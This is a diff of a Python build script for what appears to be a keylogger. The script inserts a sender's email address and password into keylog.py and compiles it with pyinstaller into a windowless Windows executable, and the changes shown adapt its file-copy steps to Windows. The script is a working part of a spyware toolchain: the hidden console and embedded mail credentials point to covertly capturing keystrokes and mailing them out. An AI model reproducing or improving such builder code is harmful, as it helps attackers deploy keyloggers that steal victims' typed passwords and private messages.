@@ -28,17 +28,19 @@ else:
 	sys.exit(1)
 
 os.mkdir('compiledir')
-os.system('copy keylog.py compiledir/keylog.py')
+os.system('copy keylog.py compiledir')
 os.chdir('compiledir')
 
+os.listdir()
 
 replaceFileContent('keylog.py', 'YOURMAILHERE', yourmail)
 replaceFileContent('keylog.py', 'YOURPASSHERE', yourpass)
 
 os.system('pyinstaller --onefile --noconsole keylog.py')
 
-os.system('cd ..; cp compiledir/dist/keylog .')
-os.chdir('../')
+os.chdir('dist')
+os.system('copy keylog.exe ..\\..\\')
+os.chdir('..\\..\\')
 shutil.rmtree('compiledir')
 
 print('\nCompiled. Executable is present in current dir.')
